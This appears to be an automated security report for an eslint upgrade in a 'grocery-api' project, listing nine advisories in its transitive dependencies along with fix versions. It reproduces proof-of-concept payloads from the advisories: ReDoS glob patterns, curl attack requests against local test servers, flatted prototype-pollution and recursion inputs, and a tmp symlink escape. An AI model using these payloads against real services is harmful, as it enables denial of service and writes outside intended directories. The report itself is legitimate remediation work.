# eslint - Vulnerability Details

**Package to Upgrade:** `eslint`

**Total Vulnerabilities:** 9

**Severity Breakdown:** 0 Critical, 5 High, 3 Medium, 1 Low

## Affected Lockfiles

- `./grocery-api/package-lock.json`

## Summary

These vulnerabilities are in transitive dependencies. Upgrade `eslint` in package.json to fix them.

## Vulnerabilities

### flatted

**Vulnerable Package:** `flatted`

**CVE Count:** 2

#### GHSA-25h7-pfq9-p65f

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-api → eslint → file-entry-cache → flat-cache → flatted

**Summary:** flatted vulnerable to unbounded recursion DoS in parse() revive phase

**Details:** ## Summary

flatted's `parse()` function uses a recursive `revive()` phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential `$` indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.

## Impact

Denial of Service (DoS). Any application that passes untrusted input to `flatted.parse()` can be crashed by an unauthenticated attacker with a single request.

flatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.

## Proof of Concept

```javascript
const flatted = require('flatted');

// Build deeply nested circular reference chain
const depth = 20000;
const arr = new Array(depth + 1);
arr[0] = '{"a":"1"}';
for (let i = 1; i <= depth; i++) {
  arr[i] = `{"a":"${i + 1}"}`;
}
arr[depth] = '{"a":"leaf"}';

const payload = JSON.stringify(arr);
flatted.parse(payload); // RangeError: Maximum call stack size exceeded
```

## Fix

The maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive `revive()` to a stack-based loop.

## Affected Versions

All versions prior to the PR #88 fix.

**Fixed In:** 3.4.0

**Direct Upgrade:** `npm install flatted@3.4.0` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

#### GHSA-rf6f-7fwh-wjgh

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-api → eslint → file-entry-cache → flat-cache → flatted

**Summary:** Prototype Pollution via parse() in NodeJS flatted

**Details:** ---
  **Summary**

  The parse() function in flatted can use attacker-controlled string values from the parsed JSON as direct array index
  keys, without validating that they are numeric. Since the internal input buffer is a JavaScript Array, accessing it
  with the key "\_\_proto\_\_" returns Array.prototype via the inherited getter. This object is then treated as a legitimate
   parsed value and assigned as a property of the output object, effectively leaking a live reference to Array.prototype
   to the consumer. Any code that subsequently writes to that property will pollute the global prototype.

  ---
  **Root Cause**

  File: esm/index.js:29 (identical in cjs/index.js)
```
  const resolver = (input, lazy, parsed, $) => output => {
    for (let ke = keys(output), {length} = ke, y = 0; y < length; y++) {
      const k = ke[y];
      const value = output[k];    
      if (value instanceof Primitive) {
        const tmp = input[value];      // Bug is here
```

No validation that value is a safe numeric index input is built as a plain Array. JavaScript's property lookup on arrays traverses the prototype chain for non-numeric  keys. The key "\_\_proto\_\_" resolves to Array.prototype, which:

  - has type "object" → passes the typeof tmp === object guard at line 30
  - is not in the parsed Set yet → passes the !parsed.has(tmp) guard.
  - The reference to Array.prototype is then enqueued in lazy and later unconditionally assigned to the output object.
  ---
  **Replication Steps**
```
  const Flatted = require('flatted'); 
  const parsed = Flatted.parse('[{"x":"__proto__"}]');
  parsed.x.polluted = 'pwned';
  console.log([].polluted);  // Returns true
``` 
 ---
  **Impact**
 An attacker can supply a crafted flatted string to parse() that causes the returned object to hold a live reference to Array.prototype, enabling any downstream code that writes to that property to pollute the global prototype chain, potentially causing denial of service or code execution.

  **Recommended solution**
 Validate that the index string represents an integer within the bounds of input before accessing it:

  // Before (vulnerable)
  const tmp = input[value];

  // After (safe)
  const idx = +value;  // coerce boxed String → number
  const tmp = (Number.isInteger(idx) && idx >= 0 && idx < input.length)
    ? input[idx]
    : undefined;

**Fixed In:** 3.4.2

**Direct Upgrade:** `npm install flatted@3.4.2` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

### minimatch

**Vulnerable Package:** `minimatch`

**CVE Count:** 3

#### GHSA-23c5-xmqv-rm74

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-api → eslint → minimatch

**Summary:** minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions

**Details:** ### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern              | Generated regex                          |
|----------------------|------------------------------------------|
| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern              | Input              | Time       |
|----------------------|--------------------|------------|
| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern              | Time         |
|-------|----------------------|--------------|
| 1     | `*(a\|b)`            | 0ms          |
| 2     | `*(*(a\|b))`         | 4ms          |
| 3     | `*(*(*(a\|b)))`      | 270ms        |
| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch'

function timed(fn) {
  const s = process.hrtime.bigint()
  let result, error
  try { result = fn() } catch(e) { error = e }
  const ms = Number(process.hrtime.bigint() - s) / 1e6
  return { ms, result, error }
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b'
  for (let i = 0; i < depth; i++) pat = `*(${pat})`
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
  console.log(`depth=${depth} "${pat}" -> ${re}`)
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15],   // ~270ms
  ['*(*(*(a|b)))', 17],   // ~800ms
  ['*(*(*(a|b)))', 19],   // ~2400ms
  ['*(*(a|b))',    23],   // ~260ms
  ['*(a|b)',      101],   // <5ms (depth=1 control)
]
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
}

// Confirm noext disables the vulnerability
const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))
console.log(`"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
```

Observed output:
```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3001
http.createServer((req, res) => {
  const url     = new URL(req.url, `http://localhost:${PORT}`)
  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0,30)}"`)
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
}).listen(PORT, () => console.log(`listening on ${PORT}`))
```

Terminal 1 -- start the server:
```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:
```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**
```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**
```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**
```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

**Fixed In:** 10.2.3, 9.0.7, 8.0.6

**Direct Upgrade:** `npm install minimatch@10.2.3` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

#### GHSA-3ppc-4f35-3m26

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-api → eslint → minimatch

**Summary:** minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern

**Details:** ### Summary
`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.


### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### PoC
When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.
### Impact
Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:
- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

----

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.

**Fixed In:** 10.2.1, 9.0.6, 8.0.5

**Direct Upgrade:** `npm install minimatch@10.2.1` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

#### GHSA-7r86-cg39-jmmj

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-api → eslint → minimatch

**Summary:** minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments

**Details:** ### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

**Fixed In:** 10.2.3, 9.0.7, 8.0.6

**Direct Upgrade:** `npm install minimatch@10.2.3` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

### ajv

**Vulnerable Package:** `ajv`

**CVE Count:** 1

#### GHSA-2g4f-4pwh-qvx6

**Severity:** MEDIUM

**CVSS Score:** 5.0

**Dependency Chain:** grocery-api → eslint → ajv

**Summary:** ajv has ReDoS when using `$data` option

**Details:** ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\"^(a|a)*$\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.

**Fixed In:** 8.18.0, 6.14.0

**Direct Upgrade:** `npm install ajv@8.18.0` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

### brace-expansion

**Vulnerable Package:** `brace-expansion`

**CVE Count:** 1

#### GHSA-f886-m6hf-6m8v

**Severity:** MEDIUM

**CVSS Score:** 7.5

**Dependency Chain:** grocery-api → eslint → minimatch → brace-expansion

**Summary:** brace-expansion: Zero-step sequence causes process hang and memory exhaustion

**Details:** ### Impact

A brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.

The loop in question:

https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184

`test()` is one of

https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113

The increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.

This affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.

### Patches


Upgrade to versions
- 5.0.5+

A step increment of 0 is now sanitized to 1, which matches bash behavior.

### Workarounds

Sanitize strings passed to `expand()` to ensure a step value of `0` is not used.

**Fixed In:** 5.0.5, 3.0.2, 2.0.3

**Direct Upgrade:** `npm install brace-expansion@5.0.5` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

### js-yaml

**Vulnerable Package:** `js-yaml`

**CVE Count:** 1

#### GHSA-mh29-5h37-fv8m

**Severity:** MEDIUM

**CVSS Score:** 5.0

**Dependency Chain:** grocery-api → eslint → js-yaml

**Summary:** js-yaml has prototype pollution in merge (<<)

**Details:** ### Impact

In js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.

### Patches

Problem is patched in js-yaml 4.1.1 and 3.14.2.

### Workarounds

You can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).

### References

https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html

**Fixed In:** 4.1.1, 3.14.2

**Direct Upgrade:** `npm install js-yaml@4.1.1` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

### tmp

**Vulnerable Package:** `tmp`

**CVE Count:** 1

#### GHSA-52f5-9888-hmc6

**Severity:** LOW

**CVSS Score:** 7.5

**Dependency Chain:** grocery-api → eslint → inquirer → external-editor → tmp

**Summary:** tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter

**Details:** ### Summary

`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.


### Details

According to the documentation there are some conditions that must be held:

```
// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50

Other breaking changes, i.e.

- template must be relative to tmpdir
- name must be relative to tmpdir
- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks

are still in place.

In order to override the system's tmpdir, you will have to use the newly
introduced tmpdir option.


// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375
* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.
     absolute paths are fine as long as they point to a location under the system's default temporary directory.
     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, 
     as tmp will not check the availability of the path, nor will it establish the requested path for you.
```

Related issue: https://github.com/raszi/node-tmp/issues/207.


The issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:
```js
// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579
function _resolvePath(name, tmpDir) {
  if (name.startsWith(tmpDir)) {
    return path.resolve(name);
  } else {
    return path.resolve(path.join(tmpDir, name));
  }
}
```

If the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:
```js
// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609
function _assertIsRelative(name, option, tmpDir) {
  if (option === 'name') {
    // assert that name is not absolute and does not contain a path
    if (path.isAbsolute(name))
      throw new Error(`${option} option must not contain an absolute path, found "${name}".`);
    // must not fail on valid .<name> or ..<name> or similar such constructs
    let basename = path.basename(name);
    if (basename === '..' || basename === '.' || basename !== name)
      throw new Error(`${option} option must not contain a path, found "${name}".`);
  }
  else { // if (option === 'dir' || option === 'template') {
    // assert that dir or template are relative to tmpDir
    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {
      throw new Error(`${option} option must be relative to "${tmpDir}", found "${name}".`);
    }
    let resolvedPath = _resolvePath(name, tmpDir); //<--- 
    if (!resolvedPath.startsWith(tmpDir))
      throw new Error(`${option} option must be relative to "${tmpDir}", found "${resolvedPath}".`);
  }
}
```


### PoC

The following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.
Tested on a Linux machine.

- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it
```bash
mkdir $HOME/mydir1

ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir
```

- check the folder is empty:
```bash
ls -lha $HOME/mydir1 | grep "tmp-"
```

- run the poc
```bash
node main.js
File:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf
test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'
test 2: dir option must be relative to "/tmp", found "/foo".
test 3: dir option must be relative to "/tmp", found "/home/user/mydir1".
```

- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):
```bash
ls -lha $HOME/mydir1 | grep "tmp-"
-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]
```


- `main.js`
```js
// npm i tmp@0.2.3

const tmp = require('tmp');

const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});
console.log('File: ', tmpobj.name);

try {
    tmp.fileSync({ 'dir': 'mydir1'});
} catch (err) {
    console.log('test 1:', err.message)
}

try {
    tmp.fileSync({ 'dir': '/foo'});
} catch (err) {
    console.log('test 2:', err.message)
}

try {
    const fs = require('node:fs');
    const resolved = fs.realpathSync('/tmp/evil-dir');
    tmp.fileSync({ 'dir': resolved});
} catch (err) {
    console.log('test 3:', err.message)
}
```


A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.
```js
function _resolvePath(name, tmpDir) {
  let resolvedPath;
  if (name.startsWith(tmpDir)) {
    resolvedPath = path.resolve(name);
  } else {
    resolvedPath = path.resolve(path.join(tmpDir, name));
  }
  return fs.realpathSync(resolvedPath);
}
```


### Impact

Arbitrary temporary file / directory write via symlink

**Fixed In:** 0.2.4

**Direct Upgrade:** `npm install tmp@0.2.4` (adds as direct dependency)

**Suggested Fix:** npm install eslint@latest (upgrade parent)

---

## Remediation Plan

**Triage Status:** Pending

**Upgrade Decision:** _To be determined by triage agent_

### Analysis

- **Current Version:** _To be determined_
- **Target Version:** _To be determined_
- **Breaking Changes:** _To be determined_
- **Affected Code:** _To be determined by codebase analysis_
- **Exposure Analysis:** _To be determined_

### Recommendation

_To be filled in by triage agent after codebase analysis_

### Testing Checklist

- [ ] Run existing test suite
- [ ] Verify no breaking changes in affected code paths
- [ ] Smoke test affected functionality

---

